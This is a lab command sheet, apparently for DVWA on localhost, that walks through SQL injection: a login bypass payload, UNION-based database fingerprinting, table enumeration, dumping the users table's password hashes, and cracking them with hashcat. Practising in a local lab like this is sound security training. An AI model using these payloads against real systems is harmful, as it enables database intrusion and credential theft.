# Commands — SQL Injection Lab

## 1. Authenticate and establish session

```bash
# Get login page and extract CSRF token
curl -c cookies.txt -s http://localhost:4280/login.php -o login.html
TOKEN=$(grep -oP "user_token' value='\K[^']+" login.html)

# Submit login with token
curl -b cookies.txt -c cookies.txt -s http://localhost:4280/login.php \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  -o login_result.html

# Confirm authenticated session
curl -b cookies.txt -s http://localhost:4280/index.php -o index_check.html
grep -o "Logout\|Welcome ::\|Login" index_check.html
```

## 2. Set security level to Low

```bash
curl -b cookies.txt -c cookies.txt -s http://localhost:4280/security.php \
  -d "security=low&seclev_submit=Submit" -o security_result.html
```

## 3. Confirm injection point — authentication logic bypass

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit#" \
  -o sqli_result.html
cat sqli_result.html
```

**Payload:** `1' OR '1'='1`

## 4. Fingerprint the database (UNION-based)

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/sqli/?id=1'+UNION+SELECT+database(),version()--+-&Submit=Submit#" \
  -o sqli_union.html
grep -A1 "First name" sqli_union.html
```

**Payload:** `1' UNION SELECT database(),version()-- -`

## 5. Enumerate table names in the current schema

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/sqli/?id=1'+UNION+SELECT+table_name,table_schema+FROM+information_schema.tables+WHERE+table_schema=database()--+-&Submit=Submit#" \
  -o sqli_tables.html
grep -A1 "First name" sqli_tables.html
```

**Payload:** `1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()-- -`

## 6. Dump credentials from the `users` table

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit#" \
  -o sqli_users.html
grep -A1 "First name" sqli_users.html
```

**Payload:** `1' UNION SELECT user,password FROM users-- -`

## 7. Crack extracted hashes (offline)

```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 -a 0 - /usr/share/wordlists/rockyou.txt
# or manually verify against known MD5 values
echo -n "password" | md5sum
```
